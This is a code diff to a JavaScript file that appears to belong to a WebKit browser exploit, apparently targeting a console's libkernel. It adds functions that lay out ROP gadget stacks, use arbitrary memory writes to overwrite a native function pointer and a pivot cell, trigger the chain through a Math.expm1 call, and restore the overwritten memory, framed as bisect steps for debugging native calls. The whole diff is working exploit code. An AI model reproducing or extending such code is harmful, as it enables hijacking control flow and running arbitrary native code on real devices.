@@ -192,10 +192,68 @@ export function stageUsleep(p, prep, libkernelBase, off, usec) {
 }
 
 /** Pivot only — webkit POP_RAX, no libkernel (bisect lk vs chain). */
+export function layoutSmokeStack(prep) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("layoutSmokeStack: no prep");
+    layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
+    prep.staged = true;
+    prep.stagedKind = "smoke";
+}
+
+export function layoutGetpidStack(prep, libkernelBase, stubOff) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("layoutGetpidStack: no prep");
+    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
+    prep.staged = true;
+    prep.stagedKind = "getpid";
+    prep.stubOff = stubOff;
+}
+
+/** Bisect step 3 — write G0 → main m_function (no expm1 yet). */
+export function bisectArmG0(p, prep) {
+    if (!prep || !prep.mainMf || !prep.G)
+        throw new Error("bisectArmG0: no prep");
+    p.write8(prep.mainMf, prep.G.G0);
+    prep.mainArmed = true;
+}
+
+/** Bisect step 4 — pivot cell → store slab S (save old val). */
+export function bisectHookPivot(p, prep) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivot: no prep");
+    if (!prep._bisect) prep._bisect = {};
+    prep._bisect.pivotSaved = p.read8(prep.pivotCell);
+    p.write8(prep.pivotCell, prep.M.S);
+}
+
+/** Bisect step 5 — Math.expm1 pivot (runs ROP chain). */
+export function bisectFireExpm1(p, prep) {
+    if (!prep || !prep.pivotObj)
+        throw new Error("bisectFireExpm1: no prep");
+    Math.expm1(prep.pivotObj);
+}
+
+/** Bisect step 6 — restore pivot cell + main m_function. */
+export function bisectRestore(p, prep) {
+    if (!prep) return;
+    if (prep._bisect && prep._bisect.pivotSaved != null)
+        p.write8(prep.pivotCell, prep._bisect.pivotSaved);
+    if (prep.mainMf && prep.mainOrig)
+        p.write8(prep.mainMf, prep.mainOrig);
+    prep.mainArmed = false;
+    prep.staged = false;
+    prep._bisect = {};
+}
+
+/** Bisect step 7+ — fire after layout (assumes hook+arm or uses full fireNativeCall). */
+export function fireNativeCallBisect(p, prep) {
+    return fireNativeCall(p, prep);
+}
+
 export function firePivotSmoke(p, prep) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("firePivotSmoke: no prep");
-    layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
+    layoutSmokeStack(prep);
     return fireNativeCall(p, prep);
 }
 
